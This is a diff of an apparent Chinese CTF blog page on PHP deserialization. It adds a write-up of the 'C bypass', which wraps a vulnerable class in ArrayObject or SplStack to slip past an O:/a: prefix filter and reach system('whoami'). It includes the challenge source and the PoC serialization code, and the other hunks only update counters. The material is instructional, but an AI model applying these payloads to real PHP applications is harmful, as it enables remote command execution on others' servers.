@@ -181,7 +181,7 @@
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
-    <div>文章</div><div class="sidebar-state-number">14</div>
+    <div>文章</div><div class="sidebar-state-number">15</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -191,7 +191,7 @@
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">20</div>
+    <div class="sidebar-state-number">21</div>
   </div>
 </div>
 <div class="sidebar-social"><div class="icon-email sidebar-social-icon">
@@ -342,7 +342,7 @@
 </span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nx">create_function</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="s1">&#39;die(`/readflag`);&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="c1">//\00lambda_1
-</span></span></span></code></pre></div><p>预期调用函数的方法</p>
+</span></span></span></code></pre></div><p>预期的调用该匿名函数的方法</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">(</span><span class="k">new</span> <span class="nv">$args</span><span class="p">[</span><span class="mi">0</span><span class="p">](</span><span class="nv">$args</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">magic</span><span class="p">}();</span>
 </span></span></code></pre></div><p>翻php手册，需要找到一个原生类可以调用函数-&gt;<code>ReflectionFunction</code>的<code>invoke</code></p>
 <p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250708134202353.png" alt="image-20250708134202273"></p>
@@ -354,7 +354,67 @@
 <h3 id="c绕过">
 <a class="header-anchor" href="#c%e7%bb%95%e8%bf%87"></a>
 C绕过
-</h3><h2 id="题解">
+</h3><p>O标识符代表对象类型，而C标识符代表类名类型。如果将O替换为C，则在反序列化时会将其解释为一个新的类名字符串，从而创建一个新的类而不是对象。因为这个新的类没有被序列化过，所以它没有任何属性或方法。</p>
+<p>题目 愚人杯3rd [easy_php]</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ctfshow</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;not allowed!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ctfshow</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;1+1&gt;2&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/^[Oa]:[\d]+/i&#34;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>poc</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// highlight_file(__FILE__);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ctfshow</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$ctfshow</span><span class="o">=</span><span class="s2">&#34;whoami&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;not allowed!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ctfshow</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">ctfshow</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$aa</span><span class="o">=</span><span class="k">new</span> <span class="nx">ArrayObject</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$aa</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">ArrayObject</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">=</span><span class="k">new</span> <span class="nx">ctfshow</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">ctfshow</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$aa</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;evil&#39;</span><span class="o">=&gt;</span><span class="nv">$a</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$A</span><span class="o">=</span><span class="k">new</span> <span class="nx">ArrayObject</span><span class="p">(</span><span class="nv">$aa</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$A</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">ctfshow</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$aa</span><span class="o">=</span><span class="k">new</span> <span class="nx">Splstack</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$aa</span><span class="o">-&gt;</span><span class="na">push</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$aa</span><span class="p">);</span>
+</span></span></code></pre></div><p>实现了unserialize接口类的大概率是C打头，列出一些以C开头的原生类：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ArrayObject::unserialize
+</span></span><span class="line"><span class="cl">ArrayIterator::unserialize
+</span></span><span class="line"><span class="cl">RecursiveArrayIterator::unserialize
+</span></span><span class="line"><span class="cl">SplDoublyLinkedList::unserialize
+</span></span><span class="line"><span class="cl">SplQueue::unserialize
+</span></span><span class="line"><span class="cl">SplStack::unserialize
+</span></span><span class="line"><span class="cl">SplObjectStorage::unserialize
+</span></span></code></pre></div><h2 id="题解">
 <a class="header-anchor" href="#%e9%a2%98%e8%a7%a3"></a>
 题解
 </h2><h3 id="预期poc">
@@ -500,10 +560,10 @@ C绕过
       Lier
     </div><div>
         <span class="icon-brush"
-          >&nbsp;12.3k</span
+          >&nbsp;13.9k</span
         >
         &nbsp;|&nbsp;
-        <span class="icon-coffee">&nbsp;00:32</span>
+        <span class="icon-coffee">&nbsp;00:36</span>
       </div><div>
         <span class="icon-eye"></span>
         <span id="busuanzi_container_site_pv"
@@ -557,7 +617,7 @@ C绕过
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
-    <div>文章</div><div class="sidebar-state-number">14</div>
+    <div>文章</div><div class="sidebar-state-number">15</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
@@ -567,7 +627,7 @@ C绕过
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
-    <div class="sidebar-state-number">20</div>
+    <div class="sidebar-state-number">21</div>
   </div>
 </div>
 <div class="sidebar-social"><div class="icon-email sidebar-social-icon">
